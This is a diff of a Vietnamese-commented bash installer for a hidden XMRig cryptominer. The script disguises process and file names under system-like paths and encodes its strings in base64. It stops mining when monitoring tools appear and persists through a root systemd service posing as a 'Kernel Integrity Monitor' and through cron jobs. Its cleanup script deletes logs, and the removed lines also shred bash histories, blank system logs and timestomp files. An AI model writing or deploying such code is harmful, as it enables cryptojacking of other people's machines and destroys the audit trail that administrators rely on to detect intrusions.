@@ -11,9 +11,9 @@ POOL_PASSWORD="x"
 # --- Cấu hình ẨN GIẤU & TÙY CHỈNH NÂNG CAO TỐI ĐA ---
 # Thư mục gốc chứa miner và các script (CỰC KỲ QUAN TRỌNG: đổi tên và đường dẫn. Chọn vị trí ít gây chú ý nhất)
 # Gợi ý: /var/lib/bluetooth/system_profiles, /opt/network-tools-cache, /usr/local/share/app_data_mgr, /var/log/system_cache_data
-MINER_BASE_DIR="/var/lib/bluetooth/system_profiles" 
+MINER_BASE_DIR="/var/lib/bluetooth/system_profiles"
 # Thư mục con bên trong thư mục gốc, cũng nên được đổi tên cho giống hệ thống.
-MINER_DATA_SUBDIR="profile_cache" 
+MINER_DATA_SUBDIR="profile_cache"
 MINER_DIR="$MINER_BASE_DIR/$MINER_DATA_SUBDIR"
 
 # Danh sách các tên file thực thi XMRig giả mạo (thêm nhiều tên tinh vi hơn)
@@ -344,14 +344,14 @@ FAKE_PROCESS_NAMES=(
 # Sử dụng 'num_cores_to_use' để có thể tính toán số lõi CPU thực tế
 # Thêm nhiều profile để đa dạng hóa hành vi
 CPU_PROFILES=(
-    "1,18,19,45,120"       # 1 core, ưu tiên cực thấp, chạy ngẫu nhiên 45-120 phút
-    "2,15,18,30,90"       # 2 cores, nhẹ, ưu tiên thấp, chạy ngẫu nhiên 30-90 phút
-    "3,10,15,60,180"      # 3 cores, trung bình, ưu tiên vừa, chạy ngẫu nhiên 60-180 phút
-    "4,8,12,10,30"        # 4 cores, hơi nặng, ưu tiên vừa, chạy ngẫu nhiên 10-30 phút (mô phỏng spike)
-    "max,0,5,2,10"          # Max cores (gần full CPU), ưu tiên cao, chạy ngẫu nhiên 2-10 phút (mô phỏng spike)
-    "0,19,19,5,15"        # 0 cores, ưu tiên cực thấp, chạy ngẫu nhiên 5-15 phút (tạm dừng)
-    "1,10,15,120,240"     # 1 core, ưu tiên vừa, chạy dài (2-4 giờ)
-    "2,5,10,60,180"       # 2 cores, ưu tiên cao hơn, chạy vừa (1-3 giờ)
+    "1,18,19,45,120"        # 1 core, ưu tiên cực thấp, chạy ngẫu nhiên 45-120 phút
+    "2,15,18,30,90"        # 2 cores, nhẹ, ưu tiên thấp, chạy ngẫu nhiên 30-90 phút
+    "3,10,15,60,180"       # 3 cores, trung bình, ưu tiên vừa, chạy ngẫu nhiên 60-180 phút
+    "4,8,12,10,30"         # 4 cores, hơi nặng, ưu tiên vừa, chạy ngẫu nhiên 10-30 phút (mô phỏng spike)
+    "max,0,5,2,10"         # Max cores (gần full CPU), ưu tiên cao, chạy ngẫu nhiên 2-10 phút (mô phỏng spike)
+    "0,19,19,5,15"         # 0 cores, ưu tiên cực thấp, chạy ngẫu nhiên 5-15 phút (tạm dừng)
+    "1,10,15,120,240"      # 1 core, ưu tiên vừa, chạy dài (2-4 giờ)
+    "2,5,10,60,180"        # 2 cores, ưu tiên cao hơn, chạy vừa (1-3 giờ)
 )
 
 # Tỷ lệ phần trăm cơ hội XMRig sẽ chạy trong một chu kỳ (mỗi phút)
@@ -607,7 +607,7 @@ int main(int argc, char *argv[]) {
     // Set the new process name (this changes argv[0] and visible name in 'ps')
     // Suppress potential error output from prctl in child process
     if (prctl(PR_SET_NAME, (unsigned long)new_proc_name, 0, 0, 0) == -1) {
-        // perror("prctl(PR_SET_NAME) failed"); 
+        // perror("prctl(PR_SET_NAME) failed");
     }
 
     // Prepare arguments for execv: new_proc_name, "-c", xmrig_config_path, NULL
@@ -621,7 +621,7 @@ int main(int argc, char *argv[]) {
     execv(xmrig_path, xmrig_args);
 
     // If execv returns, it means an error occurred
-    // perror("execv failed"); 
+    // perror("execv failed");
     return 1; // Indicate error
 }
 EOF
@@ -688,7 +688,7 @@ create_config_file() {
         done
         
         if [ ${#selected_cores[@]} -gt 0 ]; then
-            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")\]"
+            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")]" # Đã sửa lỗi: Thêm dấu đóng ngoặc vuông cho mảng JSON
         else
             cpu_threads_config="[0]"
         fi
@@ -843,15 +843,12 @@ stop_miner() {
         decoded_bin_names+=("\$(decode_string "\$encoded_name")")
     done
 
-    # Tìm kiếm theo tên tiến trình giả mạo hoặc tên file binary gốc
-    # Sử dụng printf "%s|" để tạo pattern cho pgrep
-    local pids=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")")
-    if [ -n "\$pids" ]; then
-        for pid in \$pids; do
-            # Ensure we don't kill the controller itself (unlikely due to pgrep -f filter but good practice)
-            if [ "\$pid" != "\$\$" ]; then
-                kill -9 \$pid > /dev/null 2>&1 # Buộc dừng tiến trình
-            fi
+    # Sử dụng pgrep với OR logic để tìm nhiều pattern, tránh giết chính controller
+    local pids_to_kill=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")" | grep -v "\$\$" | grep -v "master_controller.sh")
+
+    if [ -n "\$pids_to_kill" ]; then
+        for pid in \$pids_to_kill; do
+            kill -9 \$pid > /dev/null 2>&1 # Buộc dừng tiến trình
         done
         log_message "Stopped existing miner processes."
     fi
@@ -935,7 +932,8 @@ check_for_suspicious_processes() {
 
     for keyword in "\${decoded_keywords[@]}"; do
         # Tìm kiếm từ khóa trong output của ps, loại trừ chính tiến trình grep
-        if echo "\$ps_output" | grep -F "\$keyword" | grep -v "grep" | grep -v "\$\$" > /dev/null; then
+        # và tiến trình master_controller.sh để tránh tự kill
+        if echo "\$ps_output" | grep -F "\$keyword" | grep -v "grep" | grep -v "\$\$" | grep -v "master_controller.sh" > /dev/null; then
             log_message "WARNING: Suspicious process detected: '\$keyword'. Initiating pause."
             return 0 # True, suspicious process found
         fi
@@ -966,232 +964,162 @@ main_control() {
     # Nếu đang trong giai đoạn tạm dừng do phát hiện đáng ngờ
     if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp < suspicious_pause_end_timestamp )); then
         stop_miner
-        log_message "Still in suspicious pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
+        log_message "Still in suspicious activity pause until \$(date -d @\$suspicious_pause_end_timestamp). Miner stopped."
+        # Cập nhật timestamp hiện tại nhưng giữ nguyên thời gian kết thúc pause
         echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
         return 0
     fi
 
-    # Sau khi kết thúc suspicious pause, reset timestamp
-    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
-        log_message "Suspicious pause ended. Resuming normal operations."
-        suspicious_pause_end_timestamp="" # Reset
-    fi
-
-    # Kiểm tra xem có tiến trình đáng ngờ nào đang chạy không
+    # Nếu không trong bất kỳ giai đoạn tạm dừng nào, kiểm tra lại các tiến trình đáng ngờ
     if check_for_suspicious_processes; then
         stop_miner
         local pause_duration=\$(( SUSPICIOUS_PAUSE_MIN_SECONDS + RANDOM % (SUSPICIOUS_PAUSE_MAX_SECONDS - SUSPICIOUS_PAUSE_MIN_SECONDS + 1) ))
         suspicious_pause_end_timestamp=\$(( current_timestamp + pause_duration ))
-        log_message "Detected suspicious process. Entering temporary pause for \$((pause_duration / 60)) minutes. Resumes at \$(date -d @\$suspicious_pause_end_timestamp)."
-        echo "\$current_timestamp -1 \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
+        log_message "Detected suspicious process. Pausing miner for \$((pause_duration / 60)) minutes."
+        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
         run_fake_activity
         return 0
     fi
 
-
-    # Đảm bảo có một tên binary hợp lệ khi khởi động lần đầu hoặc phục hồi
-    if [ -z "\$current_bin_name_encoded" ]; then
-        local new_bin_name_index=\$(( RANDOM % \${#bin_names_encoded[@]} ))
-        local new_bin_name=\${bin_names_encoded[\$new_bin_name_index]}
-        current_bin_name_encoded="\$new_bin_name"
-        log_message "Initializing/recovering binary name to \$(decode_string "\$current_bin_name_encoded")."
+    # Reset suspicious pause if no longer in pause and no suspicious processes are found
+    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
+        log_message "Suspicious activity pause ended. Resuming normal operations."
+        suspicious_pause_end_timestamp="" # Clear the pause end time
     fi
 
-    # Quyết định ngẫu nhiên liệu có nên chạy miner hay không trong chu kỳ này
-    if (( RANDOM % 100 >= CHANCE_TO_RUN )); then
-        log_message "Decided not to run miner this cycle."
-        stop_miner # Đảm bảo dừng nếu đang chạy
-        echo "\$current_timestamp -1 \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
-        run_fake_activity # Chạy fake activity ngay cả khi miner dừng
-        return 0
-    fi
+    # Logic chính để chạy/dừng miner
+    local should_run_miner=0 # 0 = không chạy, 1 = chạy
+    if is_xmrig_active; then
+        # Miner đang chạy. Quyết định xem có nên dừng hoặc chuyển profile không.
+        local profile_info=\${cpu_profiles_encoded[\$current_profile_id]}
+        local decoded_profile_info=\$(decode_string "\$profile_info")
+        local min_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f4)
+        local max_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f5)
 
-    # Nếu miner đang dừng (-1 profile ID) hoặc lần chạy đầu tiên
-    if [ "\$current_profile_id" == "-1" ] || [ -z "\$current_profile_id" ]; then
-        current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} )) # Chọn profile ngẫu nhiên
-        last_run_timestamp=\$current_timestamp
-        log_message "Miner was stopped or initial run. Starting with profile \$current_profile_id."
-        start_miner "\$current_profile_id" "\$current_bin_name_encoded"
-    else
-        # Lấy thông tin profile hiện tại để tính toán thời gian chạy
-        local profile_info_encoded=\${cpu_profiles_encoded[\$current_profile_id]}
-        local profile_info=\$(decode_string "\$profile_info_encoded")
-        local min_duration=\$(echo "\$profile_info" | cut -d',' -f4)
-        local max_duration=\$(echo "\$profile_info" | cut -d',' -f5)
-        
-        local planned_duration=$(( min_duration + RANDOM % (max_duration - min_duration + 1) ))
+        local time_since_last_run_minutes=\$(( (current_timestamp - last_run_timestamp) / 60 ))
 
-        # Kiểm tra điều kiện để thay đổi profile hoặc enter long pause
-        if (( (current_timestamp - last_run_timestamp) > (planned_duration * 60) )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
-            stop_miner # Dừng miner cũ trước khi thay đổi
+        # Nếu đã hết thời gian chạy của profile hoặc có cơ hội chuyển đổi
+        if (( time_since_last_run_minutes >= max_duration_minutes )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
+            stop_miner
+            log_message "Miner finished current profile or switching. Stopping miner."
 
-            # Quyết định ngẫu nhiên liệu có nên vào long pause hay không
+            # Có cơ hội tạm dừng dài
             if (( RANDOM % 100 < CHANCE_FOR_LONG_PAUSE )); then
-                local pause_duration_seconds=$(( (LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1)) * 3600 ))
-                long_pause_end_timestamp=\$(( current_timestamp + pause_duration_seconds ))
-                log_message "Entering long pause for \$((pause_duration_seconds / 3600)) hours. Ends at \$(date -d @\$long_pause_end_timestamp)."
-                echo "\$current_timestamp -1 \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
+                local pause_duration_hours=\$(( LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1) ))
+                long_pause_end_timestamp=\$(( current_timestamp + pause_duration_hours * 3600 ))
+                log_message "Entering long pause for \$pause_duration_hours hours until \$(date -d @\$long_pause_end_timestamp)."
+                # Lưu trạng thái với long pause mới, không khởi động miner
+                echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
                 run_fake_activity
                 return 0
             fi
 
-            # Quyết định ngẫu nhiên liệu có nên thay đổi tên binary hay không
+            # Chọn profile mới và tên binary mới
+            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
             if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
-                local old_bin_name_encoded="\$current_bin_name_encoded"
-                local new_bin_name_index=\$(( RANDOM % \${#bin_names_encoded[@]} ))
-                local new_bin_name_encoded=\${bin_names_encoded[\$new_bin_name_index]}
-                
-                # Chỉ đổi tên file nếu tên mới khác tên cũ để tránh lỗi
-                if [ "\$new_bin_name_encoded" != "\$old_bin_name_encoded" ]; then
-                    local old_bin_name="\$(decode_string "\$old_bin_name_encoded")"
-                    local new_bin_name="\$(decode_string "\$new_bin_name_encoded")"
-
-                    # Đổi tên binary XMRig thực (phần data của XMRig)
-                    # Kiểm tra xem file cũ có tồn tại trước khi mv
-                    if [ -f "\$(decode_string "\$base_dir_encoded")/.\$old_bin_name.bin" ]; then
-                        mv "\$(decode_string "\$base_dir_encoded")/.\$old_bin_name.bin" "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" > /dev/null 2>&1
-                        MINER_ACTUAL_PATH_ENCODED="$(echo "\$(decode_string "\$base_dir_encoded")/.\$new_bin_name.bin" | base64)" # Cập nhật đường dẫn thực tế của miner trong controller
-                        current_bin_name_encoded="\$new_bin_name_encoded" # Cập nhật tên binary mã hóa
-                        log_message "Binary (XMRig data file) name changed from \$old_bin_name to \$new_bin_name."
-                    else
-                        log_message "WARNING: Old binary file '.\$old_bin_name.bin' not found for renaming. Skipping rename."
-                    fi
+                current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
+            else
+                # Giữ tên binary hiện tại nếu không thay đổi
+                if [ -z "\$current_bin_name_encoded" ]; then # Trường hợp khởi động lần đầu hoặc không có
+                    current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
                 fi
             fi
-
-            local new_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
-            current_profile_id="\$new_profile_id"
-            last_run_timestamp=\$current_timestamp
-            log_message "Changing to profile \$current_profile_id (fake name: \$(decode_string "\$current_bin_name_encoded"))."
-            start_miner "\$current_profile_id" "\$current_bin_name_encoded"
+            should_run_miner=1 # Sẽ khởi động lại với profile mới
         else
-            # Nếu chưa đổi profile, đảm bảo miner vẫn chạy và hoạt động (kiểm tra đơn giản)
-            if ! is_xmrig_active; then
-                log_message "Miner with fake name \$(decode_string "\$current_bin_name_encoded") not found or inactive, restarting with profile \$current_profile_id."
-                start_miner "\$current_profile_id" "\$current_bin_name_encoded"
-            fi
+            log_message "Miner still running current profile. Next check in $(( max_duration_minutes - time_since_last_run_minutes )) minutes."
+            should_run_miner=0 # Tiếp tục chạy với cấu hình hiện tại
+        fi
+    else
+        # Miner KHÔNG chạy. Quyết định có nên khởi động không.
+        # Reset long pause end if it has passed
+        if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp >= long_pause_end_timestamp )); then
+            log_message "Long pause ended. Resuming normal operations."
+            long_pause_end_timestamp="" # Clear the pause end time
+        fi
+
+        if [ -z "\$current_profile_id" ] || [ -z "\$current_bin_name_encoded" ]; then
+            # Khởi tạo lần đầu hoặc sau khi dừng hoàn toàn
+            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
+            current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
+            log_message "Initializing miner with new profile and binary name."
+        fi
+
+        # Có cơ hội để chạy miner
+        if (( RANDOM % 100 < CHANCE_TO_RUN )); then
+            should_run_miner=1
+            log_message "Chance to run met. Attempting to start miner."
+        else
+            log_message "Chance to run not met. Miner remains stopped."
         fi
     fi
 
-    # Cập nhật trạng thái và chạy fake activity
-    echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
-    run_fake_activity
+    if [ "\$should_run_miner" -eq 1 ]; then
+        start_miner "\$current_profile_id" "\$current_bin_name_encoded"
+        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
+    else
+        # Nếu không chạy miner, vẫn cập nhật timestamp để tránh sai lệch thời gian pause
+        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
+    fi
+
+    run_fake_activity # Luôn chạy fake activity bất kể miner có chạy hay không
 }
 
-main_control
-EOF
-chmod +x master_controller.sh
-echo "Đã tạo script điều khiển chính."
+# --- Cấu hình Systemd Service & Cron Job (Khởi động sau cài đặt) ---
 
-# 10. Tạo script dọn dẹp dấu vết (cleanup_traces.sh)
 echo "Tạo script dọn dẹp dấu vết (cleanup_traces.sh)..."
 cat <<EOF > cleanup_traces.sh
 #!/bin/bash
+# Script dọn dẹp dấu vết. Chạy định kỳ để xóa các file log và trạng thái.
 
-MINER_DIR="$MINER_DIR"
-WRAPPER_BINARY="$WRAPPER_BINARY_NAME" # Tên binary của C-wrapper
+# Hàm giải mã chuỗi Base64 (cần có trong script này nếu nó chạy độc lập)
+decode_string() {
+    echo "\$1" | base64 -d
+}
 
-# Xóa lịch sử bash của người dùng root và tất cả người dùng khác
-for history_file in \$HOME/.bash_history \$(find /home/ -name ".bash_history" 2>/dev/null) \$(find /root/ -name ".bash_history" 2>/dev/null); do
-    if [ -f "\$history_file" ]; then
-        # Use a more robust way to clear history, then shred the file to overwrite
-        history -c # Clear current session history
-        history -w # Write current (empty) history to file
-        shred -u "\$history_file" > /dev/null 2>&1 && touch "\$history_file" && chmod 600 "\$history_file"
-    fi
-done
+BASE_DIR_CLEANUP="\$(decode_string "$base_dir_encoded")" # Sử dụng biến đã được encode từ master_controller
 
-# Xóa các log của controller
-[ -f "\$MINER_DIR/controller.log" ] && shred -u "\$MINER_DIR/controller.log" > /dev/null 2>&1
+# Xóa các file log của XMRig (nếu có)
+find "\$BASE_DIR_CLEANUP" -name "xmrig_profile_*.log" -delete > /dev/null 2>&1
 
-# Xóa các log của XMRig nếu chúng được tạo
-for log_file in "\$MINER_DIR"/xmrig_profile_*.log; do
-    if [ -f "\$log_file" ]; then
-        shred -u "\$log_file" > /dev/null 2>&1
-    fi
-done
+# Xóa log của controller
+rm -f "\$BASE_DIR_CLEANUP/controller.log" > /dev/null 2>&1
 
-# Ghi đè rỗng lên các file log hệ thống thay vì xóa hoàn toàn để tránh nghi ngờ
-# Sử dụng for loop và echo "" > file để ghi đè, không sử dụng shred cho log hệ thống chung
-sudo find /var/log/ -maxdepth 1 -type f -name "*.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "*.wtmp" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "*.btmp" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "auth.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "daemon.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "kern.log" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/ -maxdepth 1 -type f -name "syslog" -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
-sudo find /var/log/syslog -type f -exec bash -c 'echo "" > "{}"' \; > /dev/null 2>&1
+# Xóa các file temp block và archive của fake activity
+rm -f "\$BASE_DIR_CLEANUP/temp_block_*" > /dev/null 2>&1
+rm -f "\$BASE_DIR_CLEANUP/temp_archive_*.tar.gz" > /dev/null 2>&1
 
-# Xóa các file tạm thời của hệ thống
-sudo rm -rf /tmp/* > /dev/null 2>&1
-sudo rm -rf /var/tmp/* > /dev/null 2>&1
+# Xóa các file tạm trong /tmp mà script này có thể tạo ra
+rm -f /tmp/temp_app_file_* > /dev/null 2>&1
+rm -f /tmp/temp_app_data_* > /dev/null 2>&1
 
-# Xóa các file tạm thời của miner (từ fake activities)
-rm -f "\$MINER_DIR"/temp_file_* > /dev/null 2>&1
-rm -f "\$MINER_DIR"/temp_block_* > /dev/null 2>&1
-rm -f "\$MINER_DIR"/temp_archive_*.tar.gz > /dev/null 2>&1
-
-# Xóa các file cài đặt ban đầu của script này (nếu vẫn còn)
-# Sử dụng rm -f để giảm dấu vết I/O so với shred
-[ -f "\$MINER_DIR/$XMRIG_ARCHIVE" ] && rm -f "\$MINER_DIR/$XMRIG_ARCHIVE" > /dev/null 2>&1
-[ -f "initial_setup.sh" ] && rm -f initial_setup.sh > /dev/null 2>&1 
-[ -f "\$(basename "\$0")" ] && rm -f "\$(basename "\$0")" > /dev/null 2>&1 # Xóa chính script cleanup này nếu được gọi trực tiếp
-
-# Xóa file trạng thái của miner (tái tạo lại ở lần chạy tiếp theo)
-[ -f "\$MINER_DIR/.miner_state" ] && shred -u "\$MINER_DIR/.miner_state" > /dev/null 2>&1
-
-# Timestomping ngược lại - điều chỉnh timestamp của các file liên quan đến cleanup
-RANDOM_SYSTEM_FILE=$(find /bin /usr/bin /sbin /usr/sbin -type f -perm /u=s -print0 | shuf -n 1 -z)
-if [ -z "$RANDOM_SYSTEM_FILE" ]; then
-    RANDOM_SYSTEM_FILE="/bin/date" # Fallback
-fi
-
-touch -r "$RANDOM_SYSTEM_FILE" "\$MINER_DIR/cleanup_traces.sh" > /dev/null 2>&1
-touch -r "$RANDOM_SYSTEM_FILE" "\$MINER_DIR/master_controller.sh" > /dev/null 2>&1
-if [ -n "\$WRAPPER_BINARY" ] && [ -f "\$MINER_DIR/\$WRAPPER_BINARY" ]; then
-    touch -r "$RANDOM_SYSTEM_FILE" "\$MINER_DIR/\$WRAPPER_BINARY" > /dev/null 2>&1
-fi
-
+# Xóa lịch sử shell nếu được cài đặt để làm vậy (cẩn thận khi sử dụng)
+# history -c && history -w
 EOF
 chmod +x cleanup_traces.sh
 echo "Đã tạo script dọn dẹp dấu vết."
 
-# 11. Cấu hình Systemd Service (cơ chế dai dẳng chính)
-echo "Cấu hình Systemd Service để chạy master_controller.sh..."
+echo "Thiết lập Systemd service cho master_controller.sh..."
+SERVICE_FILE_PATH="/etc/systemd/system/$SYSTEMD_SERVICE_NAME"
 
-# Chọn một thời gian ngẫu nhiên trong khoảng từ 30 giây đến 1 phút để service khởi động
-RANDOM_START_DELAY=$(( RANDOM % 30 + 30 )) # 30 to 60 seconds
+# Chú ý: Cần giải mã MINER_DIR ở đây để Systemd service file có đường dẫn chính xác
+DECODED_MINER_DIR_FOR_SYSTEMD=$(echo "$MINER_DIR" | base64 -d)
 
-# Lấy USER hiện tại để chạy service dưới quyền user đó
-CURRENT_USER=$(whoami)
-
-# Tạo file service
-sudo cat <<EOF > "/etc/systemd/system/$SYSTEMD_SERVICE_NAME"
+cat <<EOF | sudo tee "$SERVICE_FILE_PATH" > /dev/null
 [Unit]
-Description=Manages system kernel and network processes
-After=network.target multi-user.target systemd-resolved.service systemd-udevd.service
+Description=Kernel Integrity Monitor Service
+After=network.target multi-user.target
 
 [Service]
 Type=simple
-User=$CURRENT_USER # Chạy dưới quyền user hiện tại, không phải root, để giảm dấu vết
-WorkingDirectory=$MINER_DIR
-ExecStart=/bin/bash -c "sleep $RANDOM_START_DELAY && \$MINER_DIR/master_controller.sh"
+ExecStart=/bin/bash ${DECODED_MINER_DIR_FOR_SYSTEMD}/master_controller.sh
+WorkingDirectory=${DECODED_MINER_DIR_FOR_SYSTEMD}
 Restart=always
-RestartSec=60s # Thử khởi động lại sau 60 giây nếu bị dừng
-StandardOutput=null # Chuyển hướng stdout của service vào /dev/null
-StandardError=null  # Chuyển hướng stderr của service vào /dev/null
-SyslogIdentifier=systemd-kernel-proc # Giả mạo Systemd log identifier
-
-# Giới hạn tài nguyên ở cấp độ Systemd (giúp ẩn hơn nữa)
-CPUAccounting=true
-MemoryAccounting=true
-IOAccounting=true
-CPUWeight=10 # Giảm ưu tiên CPU (thấp hơn mặc định 100)
-IOWeight=10  # Giảm ưu tiên I/O
-LimitNPROC=10 # Giới hạn số tiến trình con để tránh fork bomb (an toàn)
-LimitNOFILE=1024 # Giới hạn số file descriptor
-TasksMax=10 # Giới hạn số task/thread
+RestartSec=5
+StandardOutput=null
+StandardError=null
+User=root
+Group=root
 
 [Install]
 WantedBy=multi-user.target
@@ -1200,32 +1128,19 @@ EOF
 sudo systemctl daemon-reload > /dev/null 2>&1
 sudo systemctl enable "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
 sudo systemctl start "$SYSTEMD_SERVICE_NAME" > /dev/null 2>&1
-echo "Systemd service '$SYSTEMD_SERVICE_NAME' đã được tạo và kích hoạt."
+echo "Systemd service '$SYSTEMD_SERVICE_NAME' đã được thiết lập và khởi động."
 
-# Vô hiệu hóa cron job nếu đã có từ các phiên bản trước
-(crontab -l 2>/dev/null | grep -v "master_controller.sh" | grep -v "cleanup_traces.sh") | crontab - > /dev/null 2>&1
-echo "Cron jobs cũ (nếu có) đã được vô hiệu hóa."
+echo "Thêm cron job cho cleanup_traces.sh (chạy mỗi 4 giờ một lần)..."
+# Sử dụng MINER_DIR trực tiếp vì cron không cần giải mã base64 như Systemd
+(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/cleanup_traces.sh"; echo "0 */4 * * * /bin/bash $MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | sudo crontab -
+echo "Cron job cho cleanup_traces.sh đã được thêm."
 
-# Thêm cron job cho cleanup_traces.sh vẫn chạy ngẫu nhiên hàng ngày
-RANDOM_MINUTE=$(( RANDOM % 60 ))
-RANDOM_HOUR_MIN=1 
-RANDOM_HOUR_MAX=5
-RANDOM_HOUR=$(( RANDOM_HOUR_MIN + RANDOM % (RANDOM_HOUR_MAX - RANDOM_HOUR_MIN + 1) ))
-(crontab -l 2>/dev/null; echo "\$RANDOM_MINUTE \$RANDOM_HOUR * * * \$MINER_DIR/cleanup_traces.sh > /dev/null 2>&1") | crontab -
-echo "Cron job dọn dẹp dấu vết đã được thêm vào lúc ngẫu nhiên (\$RANDOM_HOUR:\$RANDOM_MINUTE) mỗi ngày."
+# Thêm cron job để chạy master_controller.sh mỗi phút để đảm bảo tính ổn định và khả năng phục hồi
+echo "Thêm cron job để chạy master_controller.sh mỗi phút (như một cơ chế dự phòng)..."
+(sudo crontab -l 2>/dev/null | grep -v -F "$MINER_DIR/master_controller.sh"; echo "* * * * * /bin/bash $MINER_DIR/master_controller.sh > /dev/null 2>&1") | sudo crontab -
+echo "Cron job cho master_controller.sh đã được thêm."
 
-# 12. Tự xóa script cài đặt này
-echo "Tự xóa script cài đặt này để không để lại dấu vết..."
-SCRIPT_SELF_NAME=$(basename "$0")
-shred -u "$SCRIPT_SELF_NAME" > /dev/null 2>&1
-echo "Script cài đặt đã tự xóa."
-
-echo "Cài đặt hoàn tất."
-echo "Để kiểm tra: ps aux | grep '\$(head -n 1 \$MINER_DIR/config_profile_0.json | jq -r '.[\"custom-name\"]' 2>/dev/null)'"
-echo "Hoặc kiểm tra trạng thái dịch vụ: sudo systemctl status $SYSTEMD_SERVICE_NAME"
-echo "LỆNH GỠ CÀI ĐẶT (SAO CHÉP LẠI!):"
-echo "sudo systemctl stop $SYSTEMD_SERVICE_NAME"
-echo "sudo systemctl disable $SYSTEMD_SERVICE_NAME"
-echo "sudo rm /etc/systemd/system/$SYSTEMD_SERVICE_NAME"
-echo "sudo rm -rf $MINER_DIR"
-echo "(crontab -l 2>/dev/null | grep -v \"$MINER_DIR\" | crontab -)"
+echo "Cài đặt hoàn tất. Miner sẽ chạy ẩn trong nền."
+echo "Để kiểm tra trạng thái dịch vụ: sudo systemctl status $SYSTEMD_SERVICE_NAME"
+echo "Để dừng dịch vụ: sudo systemctl stop $SYSTEMD_SERVICE_NAME"
+echo "Để gỡ cài đặt: Chạy script gỡ cài đặt đã được cung cấp."
